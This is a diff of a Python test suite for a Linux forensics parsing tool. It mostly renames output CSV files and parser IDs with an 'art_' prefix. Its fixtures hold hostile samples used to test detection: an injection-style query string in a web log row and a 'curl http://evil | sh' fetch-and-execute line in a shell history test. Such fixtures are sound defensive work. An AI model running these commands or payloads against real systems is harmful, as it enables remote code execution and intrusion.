-    p = tmp_path / "web_access.csv"
+    p = tmp_path / "art_web_access.csv"
     p.write_text(
         "timestamp,client,method,path,status,query\n"
         '2026-01-01T00:00:01,10.0.0.5,GET,/index.php,200,"id=1;WAITFOR;SELECT;a;b;c;d;e;f;g;h"\n'
@@ -4751,7 +4764,7 @@ def test_auditd_config_flags_only_what_is_wrong(tmp_path):
                                        encoding="utf-8")
     out = tmp_path / "CSVs"
     lin_auditd_config.run(_ctx(tmp_path, out))
-    body = (out / "auditd_config.csv").read_text(encoding="utf-8").splitlines()[1:]
+    body = (out / "art_auditd_config.csv").read_text(encoding="utf-8").splitlines()[1:]
     assert body and all(r.endswith(",") for r in body)      # healthy host: nothing flagged
 
 
@@ -4800,7 +4813,7 @@ def test_consolidate_degrades_to_db_when_the_xlsx_is_locked(tmp_path, monkeypatc
 
     mdir = tmp_path / "host"
     (mdir / "CSVs" / "EventLogs").mkdir(parents=True)
-    (mdir / "CSVs" / "EventLogs" / "auth_log.csv").write_text(
+    (mdir / "CSVs" / "EventLogs" / "art_log_auth.csv").write_text(
         "timestamp,event\n2026-05-01T00:00:00+02:00,ssh_accepted\n", encoding="utf-8")
     machine = Machine(name="host", os="linux", collector="uac",
                       profile_id="linux_uac", path=mdir)
@@ -4816,7 +4829,7 @@ def test_consolidate_degrades_to_db_when_the_xlsx_is_locked(tmp_path, monkeypatc
     import sqlite3
     with sqlite3.connect(db) as c:      # the .db is complete, not an empty shell
         tables = [r[0] for r in c.execute("SELECT name FROM sqlite_master WHERE type='table'")]
-    assert tables == ["auth_log"]
+    assert tables == ["art_log_auth"]
 
 
 def test_the_prefilter_still_catches_an_uppercase_payload():
@@ -4911,8 +4924,8 @@ def test_every_declared_handler_exists_and_takes_the_contract():
 
 
 def test_the_graph_reads_csv_names_some_parser_actually_writes():
-    """`core/lateral.py` opens parser output by literal filename -- evtx_security.csv,
-    wtmp.csv, auth_log.csv and a dozen more. Nothing connects those strings to the
+    """`core/lateral.py` opens parser output by literal filename -- art_evtx_security.csv,
+    wtmp.csv, art_log_auth.csv and a dozen more. Nothing connects those strings to the
     parsers that produce them, so renaming an output would not break a test or raise
     an error: the collector would simply find no file, and the graph would come back
     thinner with no indication that a whole evidence source had dropped out. Zero
@@ -5226,7 +5239,7 @@ def _preparsed(tmp_path: Path, rows: list[list[str]], header=None,
         w.writerow(header if header is not None else _PREPARSED_HEADER)
         w.writerows(rows)
     if finished:
-        runner_marker(out.parent, "web_access").write_text("x", encoding="utf-8")
+        runner_marker(out.parent, "art_web_access").write_text("x", encoding="utf-8")
     return out
 
 
@@ -5247,7 +5260,7 @@ def test_every_field_of_a_request_survives_the_round_trip(tmp_path):
     ev = _volume_with_logs(tmp_path, _LOGLINE_XFF)
 
     # web_access writes the timeline, then the shared reader reads it back
-    p = ParserManifest(id="web_access",
+    p = ParserManifest(id="art_web_access",
                        handler="artifact_engine.handlers.lin_web_access:run")
     assert run_parser(p, _ctx(ev, ev / "CSVs" / "Web")).status == "ok"
 
@@ -5335,9 +5348,9 @@ def test_the_readers_declare_the_pass_they_depend_on():
     import yaml
     d = (Path(__file__).resolve().parent.parent / "src" / "artifact_engine"
          / "data" / "parsers" / "linux")
-    for name in ("web_metrics", "web_sigma"):
+    for name in ("art_web_metrics", "alert_web"):
         m = yaml.safe_load((d / f"{name}.yaml").read_text(encoding="utf-8"))
-        assert m.get("depends_on") == ["web_access"], name
+        assert m.get("depends_on") == ["art_web_access"], name
 
 
 def test_a_timeline_that_did_not_finish_is_not_read(tmp_path):
@@ -5382,7 +5395,7 @@ def test_a_pass_that_failed_leaves_no_timeline_at_all(tmp_path):
             lin_web_access.run(_ctx(ev, out))
     finally:
         lin_web_access.parse = real
-    assert not (out / "web_access.csv").exists()
+    assert not (out / "art_web_access.csv").exists()
 
 
 def test_a_timeline_is_not_trusted_on_a_volume_whose_logs_are_gone(tmp_path):
@@ -5484,7 +5497,7 @@ def test_fish_history_is_read_with_its_times(tmp_path):
     out = tmp_path / "CSVs"
     lin_bash.run(_ctx(tmp_path, out))
     import csv
-    with open(out / "shell_history.csv", encoding="utf-8", newline="") as fh:
+    with open(out / "art_shell_history.csv", encoding="utf-8", newline="") as fh:
         rows = [(r["user"], r["shell"], r["time_utc"], r["command"]) for r in csv.DictReader(fh)]
     assert rows == [("bob", "fish", "2023-11-14 22:13:20", "curl http://evil | sh"),
                     ("bob", "fish", "", "echo a\nb \\ c"),
@@ -5495,11 +5508,11 @@ def test_app_history_reads_the_homes_passwd_names(tmp_path):
     from artifact_engine.handlers import lin_app_history
     base = _passwd_tree(tmp_path)
     (base / "var" / "lib" / "postgresql" / ".psql_history").write_text(
-        "select * from users;\n", encoding="utf-8")
+        "select * from art_users;\n", encoding="utf-8")
     out = tmp_path / "CSVs"
     lin_app_history.run(_ctx(tmp_path, out))
-    text = (out / "app_history.csv").read_text(encoding="utf-8")
-    assert "postgres,psql,query,select * from users;" in text
+    text = (out / "art_app_history.csv").read_text(encoding="utf-8")
+    assert "postgres,psql,query,select * from art_users;" in text
 
 
 
